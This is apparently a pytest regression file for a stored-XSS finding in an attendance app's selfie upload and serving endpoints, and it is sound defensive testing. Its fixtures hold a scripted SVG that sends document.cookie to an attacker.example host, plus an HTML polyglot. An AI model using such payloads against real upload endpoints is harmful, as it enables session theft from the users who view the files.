"""SEC-15 regression — a clock-in selfie must not be storable as active content, nor
servable as a type its own bytes are not.

At `8868af8`, `attendance_evidence.submit_selfie` checked only that the caller's
DECLARED `mime` started with `image/` — which `image/svg+xml` does — then stored the
raw bytes and that declared type verbatim. `GET /api/attendance/evidence/{eid}/selfie`
echoed the stored type back, so a scripted SVG was served **`image/svg+xml`, inline,
in the application's own origin, to the manager reviewing the clock-in**.

`X-Content-Type-Options: nosniff` was already present and is no defence here: it stops
the browser guessing a type, and the declared type WAS the attack.

TWO HALVES, AND BOTH ARE NEEDED.

* **Ingest** (tests 1-3): the format is DETECTED by decoding and the bytes re-encoded,
  using the same implementation the chat upload path already had. `app/images.py` now
  holds that implementation once and `routers/chat.py` delegates to it. The auditor
  observed that this repo repeatedly contains the correct implementation applied once
  beside an uncorrected one; extracting it is what stops there being a fifth instance.
* **Serving** (tests 4-6): re-encoding makes NEW rows trustworthy and does nothing for
  rows already in the database. A production database that already contains a stored
  SVG is not made safe by fixing ingest. The serving path therefore clamps the type to
  an allow-list independently and hands anything else back as an opaque attachment.

Test 4 writes a hostile row **directly to the database**, bypassing ingest entirely,
because that is precisely the state a real deployment is in today.

EVERY ASSERTION HERE IS BEHAVIOURAL, ON PURPOSE. A first draft imported
`app.images` at module scope and, run against `8868af8` where that module does not
exist, produced a collection ImportError — a red that says "the code is different",
not "the defect is present". The module now imports on both builds and each test
drives the real ingest or the real endpoint, so every failure names the defect.
"""
import io
import os
import tempfile
from datetime import datetime, timedelta, timezone

_DB = os.path.join(tempfile.gettempdir(), f"sec15_selfie_{os.getpid()}.db")
if os.path.exists(_DB):
    os.remove(_DB)
os.environ.setdefault("DATABASE_URL", f"sqlite:///{_DB}")
os.environ.setdefault("SEED_ON_START", "true")
os.environ.setdefault("SEED_DEMO_DATA", "true")
os.environ.setdefault("JWT_SECRET", "sec15-secret-long-enough-for-tests")
os.environ.setdefault("TELEGRAM_BOT_TOKEN", "test-bot-token")

import pytest                                              # noqa: E402
from fastapi.testclient import TestClient                  # noqa: E402

from app.main import app                                   # noqa: E402
from app import attendance_evidence as AE                  # noqa: E402
from app import models, security, tenancy                  # noqa: E402

with TestClient(app):
    pass
client = TestClient(app)

BRANCH = "Store A"
OWNER = "U-owner"
PW = "demo1234"
TG = "770000015"
STAFF = "S15-staff"

SCRIPTED_SVG = (
    b'<?xml version="1.0"?>\n'
    b'<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">'
    b'<script>fetch("https://attacker.example/?c="+document.cookie)</script>'
    b'<rect width="100" height="100" fill="red"/></svg>'
)
HTML_POLYGLOT = b'<html><script>alert(document.domain)</script></html>'

# The only content types a stored selfie may ever come back as. Written as a literal
# here rather than imported, so this module states the contract independently of the
# implementation that is supposed to satisfy it.
SERVEABLE = {"image/jpeg", "image/png", "image/webp"}


def setup_module(_m):
    """A linked Telegram account, so the real ingest function can be driven."""
    with tenancy.tenant_session(1) as db:
        if not db.get(models.User, STAFF):
            db.add(models.User(id=STAFF, name="Sec15 Staff", role="employee",
                               password_hash=security.hash_pw("Sec15-Pass-9931"),
                               status="active", can_login=True))
        db.commit()
    with tenancy.system_session() as db:
        if not db.get(models.TelegramLink, TG):
            link = models.TelegramLink(tg_id=TG, user_id=STAFF, username="sec15",
                                       status="active")
            link.company_id = 1
            db.add(link)
        db.commit()


def teardown_module(_m):
    with tenancy.system_session() as db:
        db.query(models.AttendanceEvidence).filter(
            models.AttendanceEvidence.attempt_id.like("sec15-%")).delete(
            synchronize_session=False)
        db.query(models.Attendance).filter(
            models.Attendance.user_id == STAFF).delete(synchronize_session=False)
        db.query(models.TelegramLink).filter(
            models.TelegramLink.tg_id == TG).delete(synchronize_session=False)
        db.commit()


def _h(uid=OWNER, pw=PW):
    r = client.post("/api/auth/login", data={"username": uid, "password": pw})
    assert r.status_code == 200, r.text
    return {"Authorization": "Bearer " + r.json()["access_token"]}


def _png(size=(16, 16)):
    from PIL import Image
    buf = io.BytesIO()
    Image.new("RGB", size, (10, 120, 200)).save(buf, format="PNG")
    return buf.getvalue()


def _pending_attempt(tag):
    """An evidence row awaiting a selfie, so `submit_selfie` can be driven directly.

    `submit_selfie` is transport-agnostic (the module docstring says so), which is
    what makes driving the REAL ingest function possible without a Telegram worker.
    """
    now = datetime.now(timezone.utc)
    with tenancy.tenant_session(1) as db:
        db.query(models.Attendance).filter(
            models.Attendance.user_id == STAFF,
            models.Attendance.status == "active").delete(synchronize_session=False)
        ev = models.AttendanceEvidence(
            attempt_id=f"sec15-{tag}", employee_id=STAFF, employee_name="Sec15 Staff",
            tg_id=TG, branch=BRANCH, status="pending_selfie",
            lat=32.2211, lng=35.2544, dist_m=5, out_of_area=False,
            created_at=now, expires_at=now + timedelta(minutes=30))
        db.add(ev)
        db.commit()
        return ev.attempt_id


def _ingest(tag, payload, declared):
    """Run the REAL selfie ingest. Returns the stored row, or raises EvidenceError."""
    attempt = _pending_attempt(tag)
    with tenancy.tenant_session(1) as db:
        ev, _rec = AE.submit_selfie(db, TG, attempt, file_id=f"f-{tag}",
                                    msg_id=f"m-{tag}", mime=declared,
                                    raw_bytes=payload)
        return ev.selfie, ev.selfie_mime


def _plant(selfie: bytes, mime: str, tag: str) -> int:
    """Write an evidence row STRAIGHT to the database — no ingest, no validation.

    This is the shape a deployment is already in: rows written before ingest was
    fixed. A test that could only produce rows through the fixed ingest path could
    not, by construction, cover them.
    """
    with tenancy.tenant_session(1) as db:
        ev = models.AttendanceEvidence(
            attempt_id=f"sec15-plant-{tag}", employee_id=OWNER, employee_name="Owner",
            branch=BRANCH, status="complete", lat=32.2211, lng=35.2544, dist_m=5,
            out_of_area=False, selfie=selfie, selfie_mime=mime,
            selfie_at=datetime.now(timezone.utc))
        db.add(ev)
        db.commit()
        return ev.id


# ===========================================================================
# 1. INGEST — the declared type is a claim, not evidence.
# ===========================================================================
def test_0_a_real_photo_is_still_accepted():
    """Liveness. Every rejection below would also pass if selfie ingest were simply
    broken, and a clock-in that cannot complete is an outage, not a fix."""
    stored, mime = _ingest("ok", _png(), "image/png")
    assert stored, "a valid PNG produced no stored bytes"
    assert mime in SERVEABLE, f"a valid PNG was stored as {mime!r}"


@pytest.mark.parametrize("tag,payload,declared", [
    ("svg-honest", SCRIPTED_SVG, "image/svg+xml"),
    ("svg-lying", SCRIPTED_SVG, "image/png"),      # the declared type is one header edit
    ("html", HTML_POLYGLOT, "image/jpeg"),
    ("gif", b"GIF89a" + b"\x00" * 32, "image/gif"),
])
def test_1_active_content_is_refused_at_ingest_whatever_it_claims_to_be(tag, payload, declared):
    with pytest.raises(AE.EvidenceError):
        _ingest(tag, payload, declared)

    with tenancy.system_session() as db:
        ev = (db.query(models.AttendanceEvidence)
              .filter(models.AttendanceEvidence.attempt_id == f"sec15-{tag}").first())
        assert ev is not None and ev.selfie is None, (
            "the hostile payload was stored despite the rejection")


def test_2_the_stored_type_is_detected_not_declared():
    """The property, stated without enumerating hostile payloads: whatever the caller
    declares, the recorded type is derived from what the bytes decode to.

    Every value here is an `image/*` one deliberately. A non-image declaration
    (`application/pdf`, empty) is refused earlier by the friendly "send a photo, not
    a document" check, which is correct behaviour but a DIFFERENT mechanism — folding
    it in here would let this test pass because of that check rather than because the
    type is detected, which is the thing being asserted.
    """
    for i, declared in enumerate(("image/svg+xml", "image/gif", "image/jpeg", "image/webp")):
        _stored, mime = _ingest(f"detect-{i}", _png(), declared)
        assert mime == "image/png", f"declared={declared!r} was stored as {mime!r}"


def test_3_the_bytes_stored_are_re_encoded_not_the_original_upload():
    """Re-encoding is what removes a trailing polyglot payload — and, for a clock-in
    selfie specifically, the phone's own EXIF GPS tags, which are a second copy of
    the employee's location that nothing in this flow needs."""
    original = _png() + b"<<<TRAILING-POLYGLOT-PAYLOAD>>>"
    stored, mime = _ingest("polyglot", original, "image/png")
    assert b"TRAILING-POLYGLOT-PAYLOAD" not in stored, (
        "the raw upload was stored verbatim; appended bytes survived")
    assert stored != original
    assert mime in SERVEABLE


# ===========================================================================
# 2. SERVING — the half that covers rows already in the database.
# ===========================================================================
def test_4_a_legacy_svg_row_is_never_served_as_svg():
    """The row is planted directly, bypassing ingest — the state a deployed database
    is in right now, and one that fixing ingest cannot reach."""
    eid = _plant(SCRIPTED_SVG, "image/svg+xml", "svg")
    r = client.get(f"/api/attendance/evidence/{eid}/selfie", headers=_h())
    assert r.status_code == 200, r.text

    ctype = r.headers.get("content-type", "").split(";")[0].strip().lower()
    assert "svg" not in ctype, (
        f"a stored SVG was served as {ctype!r} — script in it executes in our origin")
    assert ctype not in ("text/html", "application/xhtml+xml")
    assert ctype not in SERVEABLE, (
        f"unrecognised stored content was relabelled as a real image type: {ctype!r}")

    disp = r.headers.get("content-disposition", "")
    assert disp.startswith("attachment"), (
        f"unrecognised stored content was served inline: {disp!r}")


def test_5_a_valid_stored_image_is_still_served_inline_as_itself():
    """The clamp must not break the review workflow it protects — a manager has to be
    able to look at the selfie."""
    eid = _plant(_png(), "image/png", "png")
    r = client.get(f"/api/attendance/evidence/{eid}/selfie", headers=_h())
    assert r.status_code == 200, r.text
    assert r.headers.get("content-type", "").startswith("image/png")
    assert r.headers.get("content-disposition", "").startswith("inline")


@pytest.mark.parametrize("stored_mime", [
    "image/svg+xml", "text/html", "application/xhtml+xml", "text/xml",
    "application/javascript", "image/svg+xml; charset=utf-8", "IMAGE/SVG+XML",
])
def test_6_no_stored_type_can_talk_the_endpoint_into_serving_active_content(stored_mime):
    """An allow-list, asserted as one. A denylist of dangerous types fails at the next
    member, and `IMAGE/SVG+XML` and the `; charset` form are exactly the next members.
    """
    eid = _plant(SCRIPTED_SVG, stored_mime, stored_mime.replace("/", "_").replace(";", "").replace(" ", ""))
    r = client.get(f"/api/attendance/evidence/{eid}/selfie", headers=_h())
    assert r.status_code == 200, r.text
    ctype = r.headers.get("content-type", "").split(";")[0].strip().lower()
    assert ctype not in SERVEABLE and "svg" not in ctype and "html" not in ctype \
        and "script" not in ctype and "xml" not in ctype, (
        f"stored {stored_mime!r} was served as {ctype!r}")
    assert r.headers.get("content-disposition", "").startswith("attachment")


# ===========================================================================
# 3. Why it happened.
# ===========================================================================
def test_7_chat_and_attendance_share_one_ingest_implementation():
    """SEC-15 existed because the correct implementation was applied once, in chat,
    and the second ingest path was written without it. If they diverge again, the
    next hostile-file finding is already written."""
    import inspect

    from app.routers import chat as C

    chat_src = inspect.getsource(C._process_image)
    selfie_src = inspect.getsource(AE.submit_selfie)
    assert "process_image" in selfie_src, (
        "the selfie path does not call the shared image validator; the caller's "
        "declared mime is once again the only check on its content")
    assert "process_image" in chat_src, (
        "chat no longer delegates to the shared validator — there are two "
        "implementations again, and only one of them will get the next fix")
